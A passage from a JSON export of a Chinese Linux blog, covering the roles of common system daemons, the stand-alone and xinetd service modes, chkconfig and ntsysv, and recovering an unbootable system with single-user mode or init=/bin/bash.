target=\"_blank\" rel=\"noopener noreferrer\"><strong>SuSE</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;仍然使用。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;33.innd：Usenet新闻服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;34.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ii</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;im：中文输入法服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;35.iptables：iptables防火墙守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;36.irda：红外端口守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;37.i</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>sd</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;n：isdn启动和中止服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;38.krb5－telnet:使用kerberos 5认证的telnet守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;39.klogin：远程登陆守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;40.keytable： 该进程的功能是转载在/etc/sysconfig/keyboards里定义的键盘映射表，该表可以通过kbdconfig工具进行选择。您应该使该程序处于激活状态。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;41.irqbalance：对多个系统处理器环境下的系统中断请求进行负载平衡的守护程序。如果你只安装了一个CPU，就不需要加载这个守护程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;42.kshell ：kshell守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;43.kudzu：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;硬件自动检测程序，会自动检测硬件是否发生变动，并相应进行硬件的添加、删除工作。当系统启动时，kudzu会对当前的硬件进行检测，并且和存储</p><p>&nbsp;&nbsp;&nbsp;&nbsp;在     </p><p>&nbsp;&nbsp;&nbsp;&nbsp;/etc/sysconfig/hwconf中的硬件信息进行对照，如果某个硬件从系统中被添加或者删除时，那么kudzu就会察觉到，并且通知用户是否</p><p>&nbsp;&nbsp;&nbsp;&nbsp;进行相关配置，然后修改etc/sysconfig/hwconf，使硬件资料与系统保持同步。如果/etc/sysconfig/hwconf这个文件</p><p>&nbsp;&nbsp;&nbsp;&nbsp;不存在，那么kudzu将会从/etc/modprobe.conf，/etc/sysconfig/network-scripts/和</p><p>&nbsp;&nbsp;&nbsp;&nbsp;etc/X11/XF86Config中探测已经存在的硬件。如果你不打算增加新硬件，那么就可以关闭这个启动服务，以加快系统启动时间。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;44.ldap：ldap（Lightweight Directory Access Protocol）目录访问协议服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;45.lm_ser</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>oem</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;s：检测主板工作情况守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;46.lpd ：lpd是老式打印守护程序，负责将lpr等程序提交给打印 作业。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;47.mdmonitor：RAID相关设备的守护程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;48.messagebus：D-</p><p>&nbsp;&nbsp;&nbsp;&nbsp;BUS是一个库，为两个或两个以上的应用程序提供一对一的通讯。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;dbus-daemon-1是一个应用程序，它使用这个库来实现messagebus守护程序。多个应用程序通过连接messagebus守护程序可以实</p><p>&nbsp;&nbsp;&nbsp;&nbsp;现与其他程序交换信息。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;49.microcode_ctl：可编码以及发送新的微代码到内核以更新</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Intel</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp; IA32系列处理器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;50.mysqld： 一个快速高效可靠的轻型SQL数据库引擎守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;51.named：DNS（BIND）服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;52.netplugd：netplugd（network </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ca</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;ble hotplug management daemon）守护程序，用于监控一个或多个网络接口的状态，当某些事件触发时运行一个外部脚本程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;53.netdump：远程网络备份服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;54.netfs：Network Filesystem Mounter，该进程安装和卸载NFS、SAMBA和NCP网络文件系统。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;55.nfs：网络文件系统守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;56.nfslock：NFS是一个流行的通过TCP/IP网络共享文件的协议，此守护进程提供了NFS文件锁定功能。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;57.ntpd：Network time Protocol daemon（网络时间校正协议）。ntpd是用来使系统和一个精确的时间源保持时间同步的协议守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;58.network：激活/关闭启动时的各个网络接口守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;59.psacct：该守护进程包括几个工具用来监控进程活动的工具，包括ac,lastcomm, accton 和sa。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;60.pcmcia：主要用于支持笔记本电脑接口守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;61.portmap：该守护进程用来支持RPC连接，RPC被用于NFS以及NIS 等服务。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;62.postgresql: PostgreSQL 关系数据库引擎。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;63.proftpd: proftpd 是Unix下的一个配置灵活的ftp服务器的守护程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;64.pppoe：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ADSL</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;连接守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;65.random ：保存和恢复系统的高质量随机数生成器，这些随机数是系 统一些随机行为提供的。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;66.rawdevices：在使用集群文件系统时用于加载raw设备的守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;67.readahead、</p><p>&nbsp;&nbsp;&nbsp;&nbsp;readahead_early：readahead和readahead_early是在Fedora core</p><p>&nbsp;&nbsp;&nbsp;&nbsp;2中最新推出的两个后台运行的守护程序。其作用是在启动系统期间，将启动系统所要用到的文件首先读取到内存中，然后在内存中进行执行，以加快系统的启动速</p><p>&nbsp;&nbsp;&nbsp;&nbsp;度。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;68.rhnsd：Red Hat 网络服务守护进程。通知官方的安全信息以及为系统打补丁。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;69.routed ：该守护程序支持RIP协议的自动IP路由表维护。RIP主要 使用在小型网络上，大一点的网络就需要复杂一点的协议。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;70.rsync：remote sync远程数据备份守护进程。  </p><p>&nbsp;&nbsp;&nbsp;&nbsp;71.rsh ：远程主机上启动一个shell，并执行用户命令。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;72.rwhod： 允许远程用户获得运行rwho守护程序的机器上所有已登录用户的列表。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;73.rstatd：一个为LAN上的其它机器收集和提供系统信息的守候进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;74.ruserd：远程用户定位服务，这是一个基于RPC的服务，它提供关于当前记录到LAN上一个机器日志中的用户信息 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;75.rwalld：激活rpc.rwall服务进程，这是一项基于RPC的服务，允许用户给每个注册到LAN机器上的其他终端写消息 。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;76.rwhod：激活rwhod服务进程，它支持LAN的rwho和ruptime服务。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;77.saslauthd： 使用SASL的认证守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;78.sendmail：邮件服务器sendmail守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;79.smb：Samba文件共享/打印服务守护进程。</p><p>&nbsp;&nbsp\n;&nbsp;&nbsp;80.snmpd：本地简单网络管理守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;81.squid：代理服务器squid守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;82.sshd：OpenSSH服务器守护进程。Secure Shell Protocol可以实现安全地远程管理主机。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;83.smartd：Self Monitor Analysis and Reporting Technology System，监控你的</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>硬盘</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;是否出现故障。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;84.syslog：一个让系统引导时起动syslog和klogd系统日志守候进程的脚本。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;85.time ：该守护进程从远程主机获取时间和日期，采用TCP协议。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;86.time-udp： 该守护进程从远程主机获取时间和日期，采用UDP协议。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;87.tux：在Linux内核中运行apache服务器的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;88.vsftpd：vsftpd服务器的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;89.vncserver： VNC （Virtual Network Computing，虚拟网络计算），它提供了一种在本地系统上显示远程计算机整个&quot;桌面&quot;的轻量型协议。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;90.xfs：X Window字型服务器守护进程，为本地和远程X服务器提供字型集。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;91.xinetd：支持多种网络服务的核心守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;92.ypbind：为NIS（网络信息系统）客户机激活ypbind服务进程 。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;93.yppasswdd：NIS口令服务器守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;94.ypserv：NIS主服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;95.yum：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>RPM</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong></strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"></a></strong><strong>操作系统</strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong>自动升级和软件包管理守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp; 二、守护进程工作原理和方式</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 在Cl</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ie</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;nt/Server模式下。服务器监听（Listen）在一个特定的端口上等待客户连接。连接成功后服务器和客户端通过端口进行数据通信。守护进程的工作就是打开一个端口，并且等待（Listen）进入连接。如果客户端产生一个连接请求，守护进程就创建（Fork）一个子服务器响应这个连接，而主服务器继续监听其他的服务请求。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;2.守护进程工作方式：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;（1）运行独立的守护进程</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 独立运行的守护进程由init脚本负责管理，所有独立运行的守护进程的脚本在/etc/rc.d/init.d/目录下。系统服务都是独立运行的守护进程包括：syslogd和cron等。运行独立的守护进程工作方式称作：stand－alone。它</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Unix</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;传</p><p>&nbsp;&nbsp;&nbsp;&nbsp;统的C/S模式的访问模式。服务器监听（Listen）在一个特点的端口上等待客户端的联机。如果客户端产生一个连接请求，守护进程就创建（Fork）一</p><p>&nbsp;&nbsp;&nbsp;&nbsp;个子服务器响应这个连接，而主服务器继续监听。以保持多个子服务器池等待下一个客户端请求。stand－alone模式工作原理见图1。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"/images/pic/75ea2d2fbe422bbb8b139956.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;          图1 stand－alone工作模式</p><p>&nbsp;&nbsp;&nbsp;&nbsp;工作在stand－alone模式下的网络服务有route、gated。另外是大家最熟悉是Web服务器：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Ap</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;ache和邮件服务器Sendmail、域名服务器Bind。因为这些负载很大服务器上，预先创子服务器，可以通过客户的服务速度。在</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Linux</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;系统中通过stand－alone工作模式启动的服务由/etc/rc.d/下面对应的运行级别当中的符号链接启动。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;（2）xinetd模式</p><p>&nbsp;&nbsp;&nbsp;&nbsp;从守护进程的概念可以看出，对于系统所要通过的每一种服务，都必须运行</p><p>&nbsp;&nbsp;&nbsp;&nbsp;一个监听某个端口连接所发生的守护进程，这通常意味着资源浪费。为了解决这个问题，Linux引进了“网络守护进程服务程序”的概念。Redhat</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Linux 9.0使用的网络守护进程是xinted（eXtended InterNET</p><p>&nbsp;&nbsp;&nbsp;&nbsp;daemon）。和stand－alone模式相比xinted模式也称 Internet</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Super－Server（超级服务器）。xinetd能够同时监听多个指定的端口，在接受用户请求时，他能够根据用户请求的端口不同，启动不同的网络服</p><p>&nbsp;&nbsp;&nbsp;&nbsp;务进程来处理这些用户请求。可以把xinetd看做一个管理启动服务的管理服务器，它决定把一个客户请求交给那个程序处理，然后启动相应的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;xinetd模式工作原理见图3。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"/images/pic/96e6d3ef3b8ee17063d09f56.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;           图3  xinetd工作模式</p><p>&nbsp;&nbsp;&nbsp;&nbsp;和</p><p>&nbsp;&nbsp;&nbsp;&nbsp;stand－alone工作模式相比，系统不想要每一个网络服务进程都监听其服务端口。运行单个xinetd就可以同时监听所有服务端口，这样就降低了系</p><p>&nbsp;&nbsp;&nbsp;&nbsp;统开销，保护系统资源。但是对于访问量大、经常出现并发访问时，xinetd想要频繁启动对应的网络服务进程，反而会导致系统性能下降。察看系统为</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Linux服务提供那种模式方法在Linux命令行可以使用pstree命令可以看到两种不同方式启动的网络服务。一般来说系统一些负载高的服</p><p>&nbsp;&nbsp;&nbsp;&nbsp;务：sendmail、Apache服务是单独启动的。而其他服务类型都可以使用xinetd超级服务器管理。查看目前运行的守护进程可以使用命</p><p>&nbsp;&nbsp;&nbsp;&nbsp;令：“pstree”</p><p>&nbsp;&nbsp;&nbsp;&nbsp;三、守护进程管理工具</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Linux提供了三种不同的守护进程管理工具：redhat－config－services、ntsysv、chkconfig，可以根据具体需要灵活运用。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;（1） redhat－config－services</p><p>&nbsp;&nbsp;&nbsp;&nbsp; redhat－config－services</p><p>&nbsp;&nbsp;&nbsp;&nbsp;是一个一个图形化应用程序，它显示了每项服务的描述，以及每项服务是否在引导时启动（运行级别3、4、5），并允许你启动、停止、或重新启动/etc</p><p>&nbsp;&nbsp;&nbsp;&nbsp;/rc.d/init.d 中的哪些 SysV 服务，哪些 xinetd 服务。要从桌面启动服务配置工具，点击面板上的「主菜单」 =&gt;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;「系统设置」 =&gt; 「服务器设置」 =&gt; 「服务」，或在 shell</p><p>&nbsp;&nbsp;&nbsp;&nbsp;提示下，键入命令：“redhat-config-services” （见图4）。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<i\nmg src=\"/images/pic/0d2a1924d14d7554908f9d56.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp;  </p><p>&nbsp;&nbsp;&nbsp;&nbsp;    图4 redhat-config-services配置工具</p><p>&nbsp;&nbsp;&nbsp;&nbsp; redhat-</p><p>&nbsp;&nbsp;&nbsp;&nbsp;config-services列出了 /etc/rc.d/init.d 中的服务和由 xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;控制的服务。点击左侧列表中的服务名来显示该服务的简短描述以及它的服务状态。如果这个服务不是 xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务，状态窗口会显示该服务目前是否在运行。如果该服务被 xinetd 所控制，状态窗口会显示「xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务」这个短语。要立即启动、停止、或重新启动某项服务，从列表中选择该项服务，然后点击工具栏上的相应按钮（或从「行动」拉下菜单中选择行动）。如果该</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务是一个 xinetd 服务，行动按钮会被禁用，因为它们不能被单个地启动或停止。 如果你通过选择或取消选择服务名旁的复选箱来启用或禁用了</p><p>&nbsp;&nbsp;&nbsp;&nbsp;xinetd 服务，你必须从拉下菜单中选择「文件」 =&gt; 「保存改变」来重新启动 xinetd，并立即启用或禁用你所改变的 xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务。xinetd 还被配置成自动记忆设置。你可以同时启用或禁用多个 xinetd 服务，在结束后再保存改变。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; （2）ntsysv </p><p>&nbsp;&nbsp;&nbsp;&nbsp; ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;工具为激活或停运服务提供了简单的界面。你可以使用 ntsysv 来启动或关闭由 xinetd 管理的服务。你还可以使用 ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;来配置运行级别。按照默认设置，只有当前运行级别会被配置。要配置不同的运行级别，使用 --level 选项来指定一个或多个运行级别。譬如，命令</p><p>&nbsp;&nbsp;&nbsp;&nbsp;ntsysv --level 345 配置运行级别3、4、和5。 ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;的工作界面见图1。使用上下箭头来上下查看列表。使用空格键来选择或取消选择服务，或用来“按”「确定」和「取消」按钮。要在服务列表和「确定」、「取</p><p>&nbsp;&nbsp;&nbsp;&nbsp;消」按钮中切换，使用 [Tab]键。* 标明某服务被设为启动。[F1] 键会弹出每项服务的简短描述。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;(3)chkconfig </p><p>&nbsp;&nbsp;&nbsp;&nbsp; chkconfig</p><p>&nbsp;&nbsp;&nbsp;&nbsp;命令也可以用来激活和解除服务。chkconfig --list</p><p>&nbsp;&nbsp;&nbsp;&nbsp;命令显示系统服务列表，以及这些服务在运行级别0到6中已被启动（on）还是停止（off）。chkconfig</p><p>&nbsp;&nbsp;&nbsp;&nbsp;还能用来设置某一服务在某一指定的运行级别内被启动还是被停运。譬如，要在运行级别3、4、5中停运 nfs 服务，使用下面的命令： </p><p>&nbsp;&nbsp;&nbsp;&nbsp;chkconfig --level 345 nfs off</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 再结合一下脚本，需求不一样，自行修改。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; http://hi.baidu.com/key1088/blog/item/1e1cc63231a703b95fdf0e71.html</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 四、合理选择守护进程规避安全隐患</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 运行不必要或有漏洞的守护进程会给<strong></strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"></a></strong><strong>操作系统</strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong>带</p><p>&nbsp;&nbsp;&nbsp;&nbsp;来安全和性能上的影响。对于系统安全来说，如果操作系统中的任何一个漏洞，都可能使整个系统受到攻击。所以，增加系统安全的最佳办法就是尽量监视系统的功</p><p>&nbsp;&nbsp;&nbsp;&nbsp;能。文章开始介绍了重要的守护进程，其中“crond、syslog、keytable、xinetd、kudzu、iptables”等是需要运行</p><p>&nbsp;&nbsp;&nbsp;&nbsp;的，echo、echo-udp、daytime、daytime-udp、chargen、chargen-udp主要是做调试用，普通用户基本用不</p><p>&nbsp;&nbsp;&nbsp;&nbsp;到，可以关闭。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; r字开头的守护进程：rsh、rstatd、rsync、ruser</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>sd</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;、</p><p>&nbsp;&nbsp;&nbsp;&nbsp;rwalld这些命令都是Berkley远程命令，因为都以字母r开头，故称r*命令。主要使用来使一台计算机上的某个用户以相同的帐户远程执行另一台计</p><p>&nbsp;&nbsp;&nbsp;&nbsp;算机的一个程序。但是，r命令已经被证实存在安全风险。对于确实需要的守护进程，应该尽量选用最新的版本程序，并增加其安全防范。  </p><p>&nbsp;&nbsp;&nbsp;&nbsp; 另外我们还要合理选择守护进程例如innd是运行新闻组服务的进程，如果用户不做Usenet服务器，应该关掉。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;总结：</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 基于开放源代码的Linux给用户提供了这样一个平台：可以根据自己的软、硬件环境，定制自己的Linux守护进程。因此，根据每个用户不同的应用范围定制应用环境，可以将Linux系统的安全和性能提升到新的高度。 </p><p>&nbsp;</p><p>&nbsp;</p>"},{"title":"linux 启动过程中 init加载的一些程序失败 导致系统起不来。","date":"2010-08-15T10:44:00.000Z","_content":"都知道init是linux第一个调用程序，他是系统老大哥。<br />系统启动过程中不起来，以下几点。加载内核或驱动时候错误，那是内核的问题。<br />1.系统起不来，可以先进去单用户模式，直接在grub 菜单内核后面加1就可以进去，root密码忘记也可以这样修复。<br />2.系统盘，进入修复模块。chroot什么的，系统有提示的。<br />3。也是今天要说的。<br />系统启动过程中，不加载init，跳过init。直接加载一个shell。<br /><br />和进入单用户类似，内核菜单后面添加内容一些内容。init=/bin/bash。直接指向bash。<br />因为不经过init，所有系统下的东西都不加载。可见系统也是只读的，没有经过fstab，只读不能修改任何东西的。<br />手工挂载。输入命令#mount /proc / -o remount,rw.这样就可以修改了<br />根据刚才系统不能启动错误提示，去修改一些地方。<br />然后mount /proc / -o remount,ro 还是变为只读吧。因为现在关机的时候，系统不会自动解挂。防止文件损坏。<br />最后reboot，安全重启就ok了。","source":"_posts/linux-启动过程中-init加载的一些程序失败-导致系统起不来。.md","raw":"title: linux 启动过程中 init加载的一些程序失败 导致系统起不来。\ncategories: [Linux]\ntags: []\ndate: 2010-08-15 18:44:00\n---\n都知道init是linux第一个调用程序，他是系统老大哥。<br />系统启动过程中不起来，以下几点。加载内核或驱动时候错误，那是内核的问题。<br />1.系统起不来，可以先进去单用户模式，直接在grub 菜单内核后面加1就可以进去，root密码忘记也可以这样修复。<br />2.系统盘，进入修复模块。chroot什么的，系统有提示的。<br />3。也是今天要说的。<br />系统启动过程中，不加载init，跳过init。直接加载一个shell。<br /><br />和进入单用户类似，内核菜单后面添加内容一些内容。init=/bin/bash。直接指向bash。<br />因为不经过init，所有系统下的东西都不加载。可见系统也是只读的，没有经过fstab，只读不能修改任何东西的。<br />手工挂载。输入命令#mount /proc / -o remount,rw.这样就可以修改了<br />根据刚才系统不能启动错误提示，去修改一些地方。<br />然后mount /proc / -o remount,ro 还是变为只读吧。因为现在关机的时候，系统不会自动解挂。防止文件损坏。<br />最后reboot，安全重启就ok了。","slug":"linux-启动过程中-init加载的一些程序失败-导致系统起不来。","published":1,"updated":"2023-04-22T05:38:44.796Z","_id":"clgrjlxg700357opi0wcc10qm","comments":1,"layout":"post","photos":[],"link":"","content":"<p>都知道init是linux第一个调用程序，他是系统老大哥。<br />系统启动过程中不起来，以下几点。加载内核或驱动时候错误，那是内核的问题。<br />1.系统起不来，可以先进去单用户模式，直接在grub 菜单内核后面加1就可以进去，root密码忘记也可以这样修复。<br />2.系统盘，进入修复模块。chroot什么的，系统有提示的。<br />3。也是今天要说的。<br />系统启动过程中，不加载init，跳过init。直接加载一个shell。<br /><br />和进入单用户类似，内核菜单后面添加内容一些内容。init&#x3D;&#x2F;bin&#x2F;bash。直接指向bash。<br />因为不经过init，所有系统下的东西都不加载。可见系统也是只读的，没有经过fstab，只读不能修改任何东西的。<br />手工挂载。输入命令#mount &#x2F;proc &#x2F; -o remount,rw.这样就可以修改了<br />根据刚才系统不能启动错误提示，去修改一些地方。<br />然后mount &#x2F;proc &#x2F; -o remount,ro 还是变为只读吧。因为现在关机的时候，系统不会自动解挂。防止文件损坏。<br />最后reboot，安全重启就ok了。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>都知道init是linux第一个调用程序，他是系统老大哥。<br />系统启动过程中不起来，以下几点。加载内核或驱动时候错误，那是内核的问题。<br />1.系统起不来，可以先进去单用户模式，直接在grub 菜单内核后面加1就可以进去，root密码忘记也可以这样修复。<br />2.系统盘，进入修复模块。chroot什么的，系统有提示的。<br />3。也是今天要说的。<br />系统启动过程中，不加载init，跳过init。直接加载一个shell。<br /><br />和进入单用户类似，内核菜单后面添加内容一些内容。init&#x3D;&#x2F;bin&#x2F;bash。直接指向bash。<br />因为不经过init，所有系统下的东西都不加载。可见系统也是只读的，没有经过fstab，只读不能修改任何东西的。<br />手工挂载。输入命令#mount &#x2F;proc &#x2F; -o remount,rw.这样就可以修改了<br />根据刚才系统不能启动错误提示，去修改一些地方。<br />然后mount &#x2F;proc &#x2F; -o remount,ro 还是变为只读吧。因为现在关机的时候，系统不会自动解挂。防止文件损坏。<br />最后reboot，安全重启就ok了。</p>\n"},{"title":"linux 安装 use text mode选项","date":"2011-01-07T07:51:00.000Z","_content":"<p>use text mode 选项 被忽略了 。气人、、<img src=\"/images/pic/other_site/img_baidu_j_0016.gif\" /></p><p>&nbsp;</p><p>安装linux 老版本的时候，由于相应的驱动比较老（），没有办法安装。</p><p>最后没有办法，都是用硬盘或者U盘安装，相应安装本博客已经写过了。</p><p>因为硬盘安装直接进入图形界面，中也有一个选项use text mode 。</p><p>跳过后，进入linux图形安装界面，主板显卡如果比较新的话，不被识别，就会花屏。</p><p>使用USE text mode 选型，很好。安装了好几次，都没有在意这个选项。</p><p>切记，切记。</p><p>&nbsp;</p><p><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /></p>","source":"_posts/linux-安装-use-text-mode选项.md","raw":"title: linux 安装 use text mode选项\ncategories: [Linux]\ntags: []\ndate: 2011-01-07 15:51:00\n---\n<p>use text mode 选项 被忽略了 。气人、、<img src=\"/images/pic/other_site/img_baidu_j_0016.gif\" /></p><p>&nbsp;</p><p>安装linux 